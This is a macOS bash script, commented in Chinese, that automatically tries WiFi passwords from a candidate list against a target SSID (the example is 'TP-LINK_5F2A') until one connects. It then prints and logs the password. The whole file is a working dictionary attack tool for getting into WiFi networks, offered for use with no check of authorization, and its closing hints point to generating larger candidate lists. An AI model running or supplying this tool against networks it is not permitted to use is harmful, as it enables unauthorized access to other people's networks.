#!/usr/bin/env bash
#
# wifi_try_mac.sh — 在 macOS 上自动逐个试 WiFi 密码，成功即停
#
# 为什么 macOS 能做：networksetup / CoreWLAN 不需要 entitlement，
# 而 iOS 的 NEHotspotConfiguration 需要付费证书权限。
#
# 用法：
#   ./scripts/wifi_try_mac.sh -s "TP-LINK_5F2A" -f candidates.txt
#   ./scripts/wifi_try_mac.sh -s "TP-LINK_5F2A" -f candidates.txt -i en0 -d 8
#
# 选项：
#   -s SSID      目标 WiFi 名称（必填）
#   -f FILE      候选密码文件，每行一个（必填）
#   -i IFACE     网卡，默认自动探测（en0 / en1）
#   -d SECONDS   每次尝试后的等待，默认 6
#   -n           只演练，不真的连接
#
set -uo pipefail

SSID=""
FILE=""
IFACE=""
DELAY=6
DRY=0

while getopts "s:f:i:d:nh" opt; do
  case "$opt" in
    s) SSID="$OPTARG" ;;
    f) FILE="$OPTARG" ;;
    i) IFACE="$OPTARG" ;;
    d) DELAY="$OPTARG" ;;
    n) DRY=1 ;;
    h) sed -n '2,20p' "$0"; exit 0 ;;
    *) echo "用 -h 看用法"; exit 2 ;;
  esac
done

[ -z "$SSID" ] && { echo "缺少 -s SSID"; exit 2; }
[ -z "$FILE" ] && { echo "缺少 -f 候选文件"; exit 2; }
[ -f "$FILE" ] || { echo "找不到 $FILE"; exit 2; }

# 探测默认无线网卡
if [ -z "$IFACE" ]; then
  IFACE=$(networksetup -listallhardwareports 2>/dev/null \
          | awk '/Wi-Fi|AirPort/{getline; print $2; exit}')
  IFACE="${IFACE:-en0}"
fi

TOTAL=$(wc -l < "$FILE" | tr -d ' ')
LOG="wifi_try_${SSID//[^A-Za-z0-9]/_}_$(date +%Y%m%d_%H%M%S).log"

echo "==============================================="
echo " 目标 SSID : $SSID"
echo " 网卡      : $IFACE"
echo " 候选数    : $TOTAL"
echo " 单次等待  : ${DELAY}s"
echo " 预计耗时  : $(( TOTAL * DELAY / 60 )) 分"
echo " 日志      : $LOG"
echo "==============================================="
echo

current_wifi() {
  networksetup -getairportnetwork "$IFACE" 2>/dev/null | sed 's/.*: //'
}

i=0
while IFS= read -r PW; do
  [ -z "$PW" ] && continue
  i=$((i + 1))
  printf '[%4d/%d] %-32s ' "$i" "$TOTAL" "$PW"

  if [ "$DRY" = "1" ]; then
    echo "(dry-run)"
    continue
  fi

  # networksetup 成功时无输出，失败时输出错误信息
  RESULT=$(networksetup -setairportnetwork "$IFACE" "$SSID" "$PW" 2>&1)

  if [ -z "$RESULT" ]; then
    # 再确认一次当前连的是不是目标网络
    sleep 2
    NOW=$(current_wifi)
    if [ "$NOW" = "$SSID" ]; then
      echo "✓ 成功"
      echo
      echo "==============================================="
      echo " 命中！"
      echo " SSID : $SSID"
      echo " 密码 : $PW"
      echo " 用了 : $i 次尝试"
      echo "==============================================="
      echo "$SSID|$PW|success|$(date -Iseconds)" >> "$LOG"
      exit 0
    fi
    echo "连上了但 SSID 不匹配（当前: $NOW）"
  else
    # 精简错误输出
    echo "✗ $(echo "$RESULT" | head -n 1 | cut -c1-60)"
  fi

  echo "$SSID|$PW|fail|$(date -Iseconds)" >> "$LOG"
  sleep "$DELAY"
done < "$FILE"

echo
echo "全部 $TOTAL 个候选都没成功。"
echo "日志：$LOG"
echo "建议："
echo "  1) 换 --deep 生成更多候选"
echo "  2) 确认 SSID 完全一致（大小写敏感、注意末尾空格）"
echo "  3) 密码可能是随机印刷在机身，字典无法覆盖"
exit 1
